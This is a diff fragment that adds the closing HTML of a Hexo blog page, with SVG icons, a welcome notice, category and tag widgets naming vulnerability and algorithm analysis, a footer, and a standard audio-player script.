+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        2
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>欢迎来到bvb ^~^</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+            漏洞分析 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/">
+            算法分析 (1)
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;" class="tags-cloud-0">漏洞</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 10px;" class="tags-cloud-0">算法</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+     
+    <p>&copy; 2021 <a href="/" target="_blank">marco reus</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+  <!-- aplayer 音频 start -->
+  <link rel="stylesheet" href="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.css">
+  <script type="text/javascript" src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+  <script type="text/javascript">
+    const aplayer = document.querySelectorAll(".aplayer-box");
+    aplayer && initaplayer(aplayer);
+    function initaplayer(els) {
+      let elsArr = Array.from(els);
+      elsArr.forEach(el => {
+        let params = {
+          container: el,
+          audio: { ...el.dataset },
+          theme: "#b7daff",
+          autoplay: true,
+          loop: false,
+          mutex: true,
+        }
+        if (el.dataset.lrc) {
+          params['lrcType'] = 3
+        }
+        new APlayer(params);
+      });
+    }
+  </script>
+  <!-- aplayer 音频 end -->
+  
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
